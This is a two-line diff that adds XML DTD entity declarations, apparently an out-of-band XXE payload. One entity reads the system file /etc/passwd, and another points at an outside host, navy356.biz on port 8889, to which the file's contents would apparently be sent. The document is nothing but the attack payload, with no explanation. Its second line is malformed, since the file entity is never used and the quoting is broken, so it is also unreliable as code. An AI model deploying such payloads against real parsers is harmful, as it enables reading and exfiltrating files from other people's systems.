@@ -1,0 +1,2 @@
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://navy356.biz:8889/";'>">
